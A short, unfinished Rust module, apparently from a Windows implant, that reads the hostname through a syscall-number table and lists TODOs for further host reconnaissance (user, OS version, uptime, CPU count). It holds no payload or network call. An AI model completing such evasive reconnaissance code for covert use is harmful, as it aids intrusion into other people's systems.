use crate::core::ssn_table;

fn wide_to_string(wide: &[u16]) -> String {
    let mut s = String::with_capacity(wide.len());
    for &c in wide {
        if c == 0 {
            break
        }
        s.push(if c < 128 {
            c as u8 as char
        } else {
            '?'
        });
    };
    s
}

pub unsafe fn cmd_sysinfo() -> Result<String, String> {
    let table = ssn_table::syscall_table();
    let mut output = String::with_capacity(512);

    // Hostname
    let hostname = if !table.win32.get_computer_name_ex_w.is_null() {
        type FnGetComputerNameExW = unsafe extern "system" fn(u32, *mut u16, *mut u32) -> i32;
        let func: FnGetComputerNameExW = core::mem::transmute(table.win32.get_computer_name_ex_w);
        let mut buf = [0u16; 64];
        let mut size: u32 = 64;
        if func(3, buf.as_mut_ptr(), &mut size) != 0 {
            wide_to_string(&buf[..size as usize])
        } else {
            String::from("unkown")
        }
    } else {
        String::from("unkown")
    };

    // TODO: Username
    // TODO: OS Version
    // TODO: PID for TEB
    // TODO: Uptime from KUSER_SHARED_DATA
    // TODO: CPU cores via NtQuerySystemInformation(SystemBasicInformation)
    // TODO: PID for TEB    
    unimplemented!()
}